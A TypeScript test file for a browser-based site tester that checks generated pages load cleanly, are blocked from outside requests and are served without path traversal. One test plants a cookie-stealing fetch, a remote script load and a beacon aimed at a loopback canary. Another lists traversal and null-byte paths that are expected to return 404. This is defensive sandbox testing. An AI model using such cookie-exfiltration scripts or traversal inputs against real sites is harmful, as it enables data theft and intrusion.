// AI Product Builder - the ISOLATED TEST RUN in a real headless Chromium: what a generated site is held to, and the proof that a generated page cannot reach anything but itself.
// Real browser, real pages (the pages here are written by the test, standing in for generated output); no model, no network beyond loopback.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import type { AddressInfo } from 'node:net';
import { after, describe, it } from 'node:test';
import { PlaywrightSiteTester, SiteTesterUnavailableError, serveDirectory } from '../src/product-builder/adapters/playwright-site-tester.js';
import { CHECKS, siteFiles } from './_product_builder_fakes.js';

const cleanup: Array<() => Promise<void>> = [];
after(async () => { for (const c of cleanup) await c(); });

function site(files: Array<{ path: string; content: string }>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nagex-pbt-'));
  for (const f of files) { fs.mkdirSync(path.dirname(path.join(dir, f.path)), { recursive: true }); fs.writeFileSync(path.join(dir, f.path), f.content); }
  cleanup.push(async () => { fs.rmSync(dir, { recursive: true, force: true }); });
  return dir;
}
const page = (body: string, head = '') => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Customers</title><meta name="viewport" content="width=device-width,initial-scale=1">${head}</head><body>${body}</body></html>`;
const byId = (report: { checks: Array<{ id: string; passed: boolean; detail: string }> }, id: string) => report.checks.find((c) => c.id === id);

describe('the isolated test run (real Chromium)', () => {
  const tester = new PlaywrightSiteTester();

  it('a good site passes every built-in check and every check from the plan, and leaves a picture per width', async () => {
    const dir = site(siteFiles());
    const shots = fs.mkdtempSync(path.join(os.tmpdir(), 'nagex-pbs-'));
    cleanup.push(async () => { fs.rmSync(shots, { recursive: true, force: true }); });
    const report = await tester.run({ source: { dir }, checks: CHECKS, widths: [1280, 768, 390], screenshotsDir: shots });
    assert.equal(report.passed, true, JSON.stringify(report.checks.filter((c) => !c.passed)));
    for (const id of ['builtin.loads', 'builtin.no-console-errors', 'builtin.no-external-requests', 'builtin.no-sideways-scroll-1280', 'builtin.no-sideways-scroll-768', 'builtin.no-sideways-scroll-390', 'c1', 'c2']) assert.equal(byId(report, id)?.passed, true, id);
    assert.deepEqual(report.screenshots.map((s) => s.width), [1280, 768, 390]);
    for (const s of report.screenshots) assert.ok(fs.statSync(path.join(shots, s.fileName)).size > 500, `${s.fileName} is a real picture`);
    assert.equal(report.blockedRequests, 0);
  });

  it('a page that reaches for another address is blocked, counted, and FAILS - and the other address is never contacted', async () => {
    let hits = 0;
    const canary = http.createServer((_req, res) => { hits += 1; res.writeHead(200, { 'access-control-allow-origin': '*' }).end('x'); });
    await new Promise<void>((resolve) => canary.listen(0, '127.0.0.1', () => resolve()));
    cleanup.push(() => new Promise<void>((resolve) => { canary.close(() => resolve()); canary.closeAllConnections?.(); }));
    const other = `http://127.0.0.1:${(canary.address() as AddressInfo).port}`;
    const dir = site([{ path: 'index.html', content: page(`<img src="${other}/pixel.png" alt=""><script>fetch("${other}/steal?c="+encodeURIComponent(document.cookie)).catch(function(){}); var s=document.createElement("script"); s.src="${other}/x.js"; document.head.appendChild(s); navigator.sendBeacon && navigator.sendBeacon("${other}/beacon","x");</script>`) }]);
    const report = await tester.run({ source: { dir }, checks: [], widths: [1280], screenshotsDir: null });
    assert.equal(report.passed, false);
    assert.equal(byId(report, 'builtin.no-external-requests')?.passed, false);
    assert.ok(report.blockedRequests >= 3, `blocked ${report.blockedRequests}`);
    assert.equal(hits, 0, 'the generated page never reached the other server');
  });

  it('console errors, uncaught exceptions, a missing title and sideways scrolling each fail their own check', async () => {
    const errors = await tester.run({ source: { dir: site([{ path: 'index.html', content: page('<p>hi</p><script>console.error("boom"); setTimeout(function(){ throw new Error("late"); }, 10);</script>') }]) }, checks: [], widths: [1280], screenshotsDir: null });
    assert.equal(byId(errors, 'builtin.no-console-errors')?.passed, false);
    assert.match(errors.consoleErrors.join(' '), /boom/);

    const noTitle = await tester.run({ source: { dir: site([{ path: 'index.html', content: '<!doctype html><html><body><p>no title</p></body></html>' }]) }, checks: [], widths: [1280], screenshotsDir: null });
    assert.equal(byId(noTitle, 'builtin.loads')?.passed, false);

    const wide = await tester.run({ source: { dir: site([{ path: 'index.html', content: page('<div style="width:900px;height:20px;background:#ccc">wide</div>') }]) }, checks: [], widths: [1280, 390], screenshotsDir: null });
    assert.equal(byId(wide, 'builtin.no-sideways-scroll-1280')?.passed, true);
    assert.equal(byId(wide, 'builtin.no-sideways-scroll-390')?.passed, false);
    assert.equal(wide.passed, false);
  });

  it('plan checks are really exercised: a search that does not filter, a missing element and missing text fail with their reason', async () => {
    const noFilter = site(siteFiles({ 'app.js': '/* search does nothing */' }));
    const a = await tester.run({ source: { dir: noFilter }, checks: CHECKS, widths: [1280], screenshotsDir: null });
    assert.equal(byId(a, 'c1')?.passed, true);
    assert.equal(byId(a, 'c2')?.passed, false);
    assert.match(byId(a, 'c2')!.detail, /STILL shown \(the list did not narrow\)/);

    const b = await tester.run({ source: { dir: site(siteFiles()) }, widths: [1280], screenshotsDir: null, checks: [
      { id: 'e1', description: 'a dashboard', kind: 'ELEMENT_PRESENT', selector: '#dashboard' },
      { id: 't1', description: 'a welcome', kind: 'TEXT_PRESENT', text: 'Welcome back' },
      { id: 't2', description: 'a name', kind: 'TEXT_PRESENT', text: 'Hanbit' },
      { id: 'bad', description: 'a broken selector', kind: 'ELEMENT_PRESENT', selector: '#a >>> ((' },
    ] });
    assert.deepEqual(['e1', 't1', 't2', 'bad'].map((id) => byId(b, id)?.passed), [false, false, true, false]);
    assert.equal(b.passed, false);
    // the reason is what lets a repair fix the cause: absent, or present but hidden when the page first loads
    assert.match(byId(b, 'e1')!.detail, /nothing on the page matches #dashboard/);
    assert.match(byId(b, 't1')!.detail, /does not appear anywhere on the page/);
    assert.match(byId(b, 'bad')!.detail, /not a usable selector|nothing on the page matches/);
    const hidden = site([{ path: 'index.html', content: page('<input id="search" style="display:none"><div id="customers" hidden>Hanbit</div><p hidden>Secret tab text</p><section id="tab" style="display:none">in a tab</section>') }]);
    const c = await tester.run({ source: { dir: hidden }, widths: [1280], screenshotsDir: null, checks: [
      { id: 'h1', description: 'tab content', kind: 'ELEMENT_PRESENT', selector: '#tab' },
      { id: 'h2', description: 'tab text', kind: 'TEXT_PRESENT', text: 'Secret tab text' },
      CHECKS[1],
    ] });
    assert.match(byId(c, 'h1')!.detail, /exists but is not visible when the page first loads/);
    assert.match(byId(c, 'h2')!.detail, /in the page but hidden when the page first loads/);
    assert.match(byId(c, 'c2')!.detail, /the search field: .*exists but is not visible/);
  });

  it('a record the search should show but the page never had is reported as such (the check cannot pass by hiding everything)', async () => {
    const dir = site(siteFiles({ 'index.html': page('<input id="search"><ul id="customers"><li>Daon</li></ul>') }));
    const report = await tester.run({ source: { dir }, checks: [CHECKS[1]], widths: [1280], screenshotsDir: null });
    assert.equal(byId(report, 'c2')?.passed, false);
    assert.match(byId(report, 'c2')!.detail, /not shown before searching/);
  });

  it('can test a deployed address (url) with the network limited to that address only', async () => {
    const dir = site(siteFiles());
    const served = await serveDirectory(dir);
    cleanup.push(() => served.close());
    const report = await tester.run({ source: { url: served.origin + '/' }, checks: CHECKS, widths: [1280, 390], screenshotsDir: null });
    assert.equal(report.passed, true, JSON.stringify(report.checks.filter((c) => !c.passed)));
  });

  it('the static server reaches only the workspace: traversal, hidden and disallowed paths are 404', async () => {
    const dir = site(siteFiles());
    fs.writeFileSync(path.join(path.dirname(dir), 'secret-outside.txt'), 'outside');
    cleanup.push(async () => { fs.rmSync(path.join(path.dirname(dir), 'secret-outside.txt'), { force: true }); });
    const served = await serveDirectory(dir);
    cleanup.push(() => served.close());
    const get = async (p: string) => (await fetch(served.origin + p)).status;
    assert.equal(await get('/'), 200);
    assert.equal(await get('/styles.css'), 200);
    for (const p of ['/..%2fsecret-outside.txt', '/%2e%2e/secret-outside.txt', '/../secret-outside.txt', '/.env', '/index.html%00.js', '/missing.html', '/sub/..%5cindex.html']) assert.equal(await get(p), 404, p);
    assert.equal((await fetch(served.origin + '/', { method: 'POST' })).status, 405);
  });

  it('without the isolated browser the run is "unavailable" - it never reports a pass', async () => {
    class NoBrowser extends PlaywrightSiteTester { public override available(): boolean { return false; } }
    await assert.rejects(() => new NoBrowser().run({ source: { dir: site(siteFiles()) }, checks: [], widths: [1280], screenshotsDir: null }), (e: unknown) => e instanceof SiteTesterUnavailableError && e.code === 'SITE_TESTER_UNAVAILABLE');
  });
});
